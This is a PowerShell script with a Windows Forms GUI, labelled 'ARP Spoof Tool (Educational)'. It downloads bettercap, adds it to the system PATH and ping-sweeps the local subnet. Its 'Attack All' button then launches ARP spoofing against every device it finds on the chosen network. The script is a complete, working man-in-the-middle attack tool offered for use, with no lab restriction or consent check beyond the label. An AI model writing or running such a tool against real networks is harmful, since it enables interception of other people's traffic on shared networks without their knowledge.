# SOLO FUNCIONA EN WINDOWS POWERSHELL, NO POWERSHELL CORE
if ($PSVersionTable.PSEdition -ne "Desktop") {
    Write-Error "Este script requiere Windows PowerShell (no PowerShell Core). Abrí PowerShell clásico."
    exit
}

# Cargar los ensamblados necesarios para Windows Forms
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bettercapPath = "C:\bettercap\bettercap.exe"
$bettercapFolder = "C:\bettercap"

if (-not (Test-Path $bettercapPath)) {
    Write-Host "Bettercap not found. Downloading and installing..." -ForegroundColor Yellow

    try {
        if (Test-Path $bettercapFolder) {
            Remove-Item -Recurse -Force $bettercapFolder
        }
        New-Item -ItemType Directory -Path $bettercapFolder | Out-Null

        $zipUrl = "https://github.com/bettercap/bettercap/releases/download/v2.31.1/bettercap_windows_amd64_v2.31.1.zip"
        $zipPath = "$bettercapFolder\bettercap.zip"

        Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing

        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $bettercapFolder)

        Remove-Item $zipPath -Force

        if (Test-Path $bettercapPath) {
            Write-Host "✅ Bettercap installed successfully!" -ForegroundColor Green
        } else {
            throw "❌ bettercap.exe not found after extraction."
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Failed to install Bettercap: $($_.Exception.Message)`nTry running this script as administrator.","Installation Error")
        exit
    }
}

# Agregar al PATH si no está
$envPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
if ($envPath -notlike "*$bettercapFolder*") {
    Write-Host "Adding Bettercap to system PATH..." -ForegroundColor Cyan
    $newPath = "$envPath;$bettercapFolder"
    [Environment]::SetEnvironmentVariable("Path", $newPath, "Machine")
    Write-Host "Bettercap path added. You may need to restart your terminal to use it." -ForegroundColor Green
}

# --- ESCANEAR REDES WI-FI ---
$wifiNetworks = @()
$scanOutput = netsh wlan show networks mode=bssid
foreach ($line in $scanOutput) {
    if ($line -match "^\s*SSID\s+\d+\s+:\s+(.+)$") {
        $ssid = $matches[1].Trim()
        if (-not $wifiNetworks.Contains($ssid)) {
            $wifiNetworks += $ssid
        }
    }
}

# --- OBTENER ADAPTADORES DISPONIBLES CON TIPO ---
$adaptersRaw = Get-NetAdapter |
    Where-Object {
        $_.InterfaceDescription -notmatch "Virtual|Loopback|VPN|TAP" -and
        $_.HardwareInterface -eq $true
    }

$adapters = @{}
foreach ($a in $adaptersRaw) {
    $type = if ($a.InterfaceDescription -match "wireless|wi[- ]?fi|802\.11") { "Wireless" } else { "Wired" }
    $status = $a.Status
    $displayName = "$($a.Name) ($type, $status)"
    $adapters[$displayName] = $a.Name
}

# --- GUI ---
$form = New-Object System.Windows.Forms.Form
$form.Text = "ARP Spoof Tool (Educational)"
$form.Size = New-Object System.Drawing.Size(500,470)
$form.StartPosition = "CenterScreen"

$lblNetwork = New-Object System.Windows.Forms.Label
$lblNetwork.Text = "Select Wi-Fi Network:"
$lblNetwork.Location = New-Object System.Drawing.Point(20,20)
$form.Controls.Add($lblNetwork)

$comboNetwork = New-Object System.Windows.Forms.ComboBox
$comboNetwork.Location = New-Object System.Drawing.Point(160,18)
$comboNetwork.Size = New-Object System.Drawing.Size(300,20)
$comboNetwork.DropDownStyle = "DropDownList"
$wifiNetworks | ForEach-Object { $comboNetwork.Items.Add($_) }
$form.Controls.Add($comboNetwork)

$lblRouter = New-Object System.Windows.Forms.Label
$lblRouter.Text = "Router IP:"
$lblRouter.Location = New-Object System.Drawing.Point(20,100)
$form.Controls.Add($lblRouter)

$txtRouter = New-Object System.Windows.Forms.TextBox
$txtRouter.Location = New-Object System.Drawing.Point(160,100)
$txtRouter.Size = New-Object System.Drawing.Size(200,20)
$form.Controls.Add($txtRouter)

$btnDetectRouter = New-Object System.Windows.Forms.Button
$btnDetectRouter.Text = "Detect Gateway"
$btnDetectRouter.Location = New-Object System.Drawing.Point(370, 98)
$btnDetectRouter.Size = New-Object System.Drawing.Size(90,23)
$btnDetectRouter.Add_Click({
    $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Sort-Object RouteMetric | Select-Object -First 1).NextHop
    $txtRouter.Text = $gateway
})
$form.Controls.Add($btnDetectRouter)

$lblInterface = New-Object System.Windows.Forms.Label
$lblInterface.Text = "Select Network Adapter:"
$lblInterface.Location = New-Object System.Drawing.Point(20,140)
$form.Controls.Add($lblInterface)

$comboInterface = New-Object System.Windows.Forms.ComboBox
$comboInterface.Location = New-Object System.Drawing.Point(160,138)
$comboInterface.Size = New-Object System.Drawing.Size(300,20)
$comboInterface.DropDownStyle = "DropDownList"
$adapters.Keys | ForEach-Object { $comboInterface.Items.Add($_) }
$form.Controls.Add($comboInterface)

$lblScanResult = New-Object System.Windows.Forms.Label
$lblScanResult.Text = "Connected Devices:"
$lblScanResult.Location = New-Object System.Drawing.Point(20,180)
$form.Controls.Add($lblScanResult)

$listDevices = New-Object System.Windows.Forms.ListBox
$listDevices.Location = New-Object System.Drawing.Point(20,200)
$listDevices.Size = New-Object System.Drawing.Size(440,100)
$form.Controls.Add($listDevices)

$btnScanDevices = New-Object System.Windows.Forms.Button
$btnScanDevices.Text = "Scan Network"
$btnScanDevices.Location = New-Object System.Drawing.Point(160,310)
$btnScanDevices.Size = New-Object System.Drawing.Size(130,30)

$btnScanDevices.Add_Click({
    $listDevices.Items.Clear()
    $selectedDisplay = $comboInterface.SelectedItem
    if (-not $selectedDisplay) {
        [System.Windows.Forms.MessageBox]::Show("Please select a network adapter.","Missing Info")
        return
    }

    $selectedIface = $adapters[$selectedDisplay]
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $selectedIface | Where-Object {$_.IPAddress -ne "127.0.0.1"}).IPAddress
    if (-not $localIP) {
        [System.Windows.Forms.MessageBox]::Show("Can't detect IP for interface '$selectedIface'.","Error")
        return
    }

    $baseIP = ($localIP -replace "\.\d+$", ".")

    $aliveIPs = @()

    1..254 | ForEach-Object {
        $ip = "$baseIP$_"
        $pingResult = ping -n 1 -w 100 $ip | Out-String
        if ($pingResult -match "TTL=") {
            $aliveIPs += $ip
            $listDevices.Items.Add($ip)
        }
    }
    
    if ($aliveIPs.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("No devices found. Try again.","Scan Result")
    }
})

$form.Controls.Add($btnScanDevices)

$btnRun = New-Object System.Windows.Forms.Button
$btnRun.Text = "Attack All"
$btnRun.Location = New-Object System.Drawing.Point(160,360)
$btnRun.Size = New-Object System.Drawing.Size(130,30)
$btnRun.Add_Click({
    $selectedSSID = $comboNetwork.SelectedItem
    $router = $txtRouter.Text
    $selectedDisplay = $comboInterface.SelectedItem
    $iface = $adapters[$selectedDisplay]
    $bettercapPath = "C:\bettercap\bettercap.exe"

    # Recolectar todas las IPs del listado
    $targets = @()
    $listDevices.Items | ForEach-Object {
        if ($_ -match "^(\d{1,3}(\.\d{1,3}){3})") {
            $targets += $matches[1]
        }
    }
    $target = $targets -join ","

    if ($selectedSSID -and $targets.Count -gt 0 -and $router -and $iface) {
        [System.Windows.Forms.MessageBox]::Show("Launching ARP Spoof against $($targets.Count) targets...","Info")
        $cmd = "`"$bettercapPath`" -iface $iface -eval `"set arp.spoof.targets $target; set arp.spoof.internal true; arp.spoof on`""
        Start-Process powershell -ArgumentList "-NoExit", "-Command", $cmd
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Please complete all fields (Make sure devices are scanned).","Missing info")
    }
})
$form.Controls.Add($btnRun)

$form.Topmost = $true
$form.ShowDialog()